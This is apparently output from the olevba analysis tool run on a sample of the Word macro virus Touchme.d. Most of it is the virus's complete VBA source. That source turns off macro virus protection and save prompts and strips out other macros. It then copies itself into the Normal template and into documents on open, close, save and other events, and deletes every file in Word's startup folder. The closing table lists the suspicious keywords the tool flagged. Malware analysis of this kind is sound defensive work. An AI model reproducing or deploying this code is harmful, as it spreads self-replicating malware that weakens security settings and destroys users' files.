olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Touchme.d-b3e6d4745922a46fede1b6fbabf375b4b57eb3d3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Touchme.d-b3e6d4745922a46fede1b6fbabf375b4b57eb3d3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' This code written by Reza Pc 212
' Copyright (C) 1999 ReYoKh Team Labs
' University of Gunadarma
'
' for all virii maker 'n the stupid jerk
'
' Last Up-Date 3 November 1999 [19.00:00]

Private Sub Infected()
    On Error Resume Next
    ID = "'tHe FuCkIng aV if TOuCh mE"
    Dim ADSave, NTSave, ADInfect, NTInfect As Boolean
    Dim Listing, Active, Ultah, Name As String
    Dim AD, NT As Object
    
    Set AD = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
    Set NT = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    If AD.Lines(99, 1) = ID Then ADInfect = True
    If NT.Lines(99, 1) = ID Then NTInfect = True
            
    ActiveDocument.Protect -1
    ActiveDocument.Password = ""
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    WordBasic.DisableAutoMacros True
    Application.Caption = "Mikrosof Werd"
    
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name <> "EcHa" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name <> "EcHa" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    
    If NTInfect = False Then
        NTSave = NormalTemplate.Saved
        Listing = AD.Lines(1, AD.CountOfLines)
        NT.DeleteLines 1, NT.CountOfLines
        NT.AddFromString Listing
        If NTSave = True Then NormalTemplate.Save
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate, Name:="EcHa", Object:=wdOrganizerObjectProjectItems
    End If
    
    ADSave = ActiveDocument.Saved
    Listing = NT.Lines(1, NT.CountOfLines)
    AD.DeleteLines 1, AD.CountOfLines
    AD.AddFromString Listing
    If ADSave = True Then ActiveDocument.Save
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
    Destination:=ActiveDocument, Name:="EcHa", Object:=wdOrganizerObjectProjectItems
        
    If Day(Date) = 1 Then Name = ID
    If Day(Date) = 5 And Month(Date) = 3 Then Name = "REZA"
    If Day(Date) = 8 And Month(Date) = 8 Then Name = "YOMBI"
    If Day(Date) = 22 And Month(Date) = 12 Then Name = "NELIS"
    If Name <> "" And Name <> ID Then
        Ultah = "Oh ya... Selamat Ulang Tahun !!!" + Chr(13) + Name + _
                ", I hope you always Happy"
        Active = Assistant.Visible
        Assistant.Visible = True
        With Assistant.NewBalloon
            .Text = "EcHa mengucapkan terima kasih... " + Chr(13) + _
                    "Telah menggunakan macro saya" + Chr(13) + Chr(13) + Ultah
            .Show
        End With
        Assistant.Visible = Active
    End If
    Kill Application.StartupPath + "\*.*"
    Options.VirusProtection = True
    WordBasic.DisableAutoMacros False
End Sub
Private Sub Document_Close()
    Infected
End Sub
Private Sub Document_Open()
    Infected
End Sub
Private Sub Document_Save()
    Infected
End Sub
Private Sub Document_New()
    Infected
End Sub
Private Sub Document_Exit()
    Infected
End Sub
Private Sub Document_Exec()
    Infected
End Sub
'tHe FuCkIng aV if TOuCh mE




































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |DF@                 |REZA                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+
